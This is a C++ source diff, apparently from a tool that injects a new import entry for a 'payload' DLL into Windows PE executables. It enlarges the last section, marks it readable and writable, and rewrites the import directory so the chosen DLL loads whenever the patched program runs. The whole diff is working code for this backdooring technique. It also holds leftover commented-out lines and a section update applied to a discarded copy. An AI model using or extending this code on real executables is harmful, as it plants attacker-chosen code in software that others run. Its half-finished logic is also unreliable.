@@ -37,10 +37,10 @@ public:
     std::ifstream file;
     file.open(filename, std::ios::binary);
 
-    uintmax_t size = std::filesystem::file_size(filename);
-    data_ = new char[size];
-    dataSize_ = size;
-    file.read(data_, size);
+    fileSize_ = std::filesystem::file_size(filename);
+    data_ = new char[fileSize_];
+    dataSize_ = fileSize_;
+    file.read(data_, fileSize_);
 
     if ((data_[0] == 0x4d && data_[1] == 0x5a) ||
         (data_[0] == 0x5a && data_[1] == 0x4d))
@@ -179,25 +179,10 @@ public:
     }
   }
 
-  uint32_t
-  UpdateLastSection(std::string payloadDll, std::string dummyFunc)
-  {
-    auto sectParams = sectionsParams_.back();
-    uint32_t originalSize = sectParams.rawDataSize;
-    uint32_t newImportSize = CalculateNewImportSize_(payloadDll, dummyFunc);
-    sectParams.characteristics |= 0xC0000000;
-    uint32_t addSize = Align_(originalSize, 0x1000) +
-                       Align_(newImportSize, 0x200) - originalSize;
-    sectParams.virtualSize += addSize;
-    sectParams.virtualAddress += addSize;
-    return originalSize;
-  }
-
   void
-  CreateNewImport(const uint32_t originalSize, std::string payloadDll,
-                  std::string dummyFunc)
+  CreateNewImport(std::string payloadDll, std::string dummyFunc)
   {
-    uint32_t offset = Align_(originalSize, 0x1000);
+    uint32_t offset = Align_(static_cast<uint32_t>(fileSize_), 0x1000);
     uint32_t size = CalculateNewImportSize_(payloadDll, dummyFunc);
     std::unique_ptr<char[]> buff(new char[size]);
     uint32_t baseAddress = sectionsParams_.back().virtualAddress + offset;
@@ -241,15 +226,16 @@ public:
     memset(&buff[n], '\0', 12);
     n += 12;
 
-    uint32_t beginSize = sectionsParams_.back().rawDataAddress + originalSize;
+    uint32_t beginSize = sectionsParams_.back().rawDataAddress +
+                         static_cast<uint32_t>(fileSize_);
     uint32_t beginAlign = sectionsParams_.back().rawDataAddress +
-                          Align_(originalSize, 0x1000);
+                          Align_(static_cast<uint32_t>(fileSize_), 0x1000);
     uint32_t endAlign = Align_(n, 0x200);
 
     uint32_t newDataSize = beginAlign + endAlign;
     char* newData = new char[newDataSize];
     memcpy_s(newData, newDataSize, data_, beginSize);
-    memcpy_s(newData + beginAlign, newDataSize, &buff[0], n);
+    memcpy_s(newData + beginAlign, newDataSize - beginAlign, &buff[0], n);
 
     delete data_;
     data_ = newData;
@@ -257,23 +243,35 @@ public:
     std::cout << '\t' << __c(42, "[+]") <<
                  "\tNew file size: " << dataSize_ << std::endl;
 
-    memcpy_s(data_, dataSize_, &baseAddress, 4);
+    //memcpy_s(data_, 4, &baseAddress, 4);
+    memcpy_s(&data_[headerOffset_ + importDataDirRVAOffset_],
+             4, &beginAlign, 4);
     uint32_t newImportSize = *reinterpret_cast<uint32_t*>(
       &data_[headerOffset_ + importDataDirSizeOffset_]);
     newImportSize += 0x14;
     memcpy_s(&data_[headerOffset_ + importDataDirSizeOffset_],
-             dataSize_, &newImportSize, 4);
+             4, &newImportSize, 4);
     FixSizeOfImage_();
+
+    // ---------------------
+    auto sectParams = sectionsParams_.back();
+    //uint32_t originalSize = sectParams.rawDataSize;
+    //uint32_t newImportSize = CalculateNewImportSize_(payloadDll, dummyFunc);
+    sectParams.characteristics |= 0xC0000000;
+    uint32_t addSize = Align_(sectParams.rawDataSize, 0x1000) +
+                       Align_(size, 0x200) - sectParams.rawDataSize;
+    sectParams.virtualSize += addSize;
+    sectParams.virtualAddress += addSize;
   }
 
-  void Save(char* filename)
+  void Save(const char* filename)
   {
-    std::string outPath = filename;
-    auto dirPath = outPath.substr(0, outPath.find_last_of("\\/"));
+    /*std::string outPath = filename;
+    auto dirPath = outPath.substr(0, outPath.find_last_of('/'));
     if (!dirPath.empty())
     {
       std::filesystem::create_directory(&dirPath.front());
-    }
+    }*/
 
     std::ofstream ofile;
     ofile.open(filename, std::ios::binary);
@@ -281,6 +279,7 @@ public:
   }
 
 private:
+  uintmax_t fileSize_;
   char*   data_;
   size_t  dataSize_;
   char*   importData_;
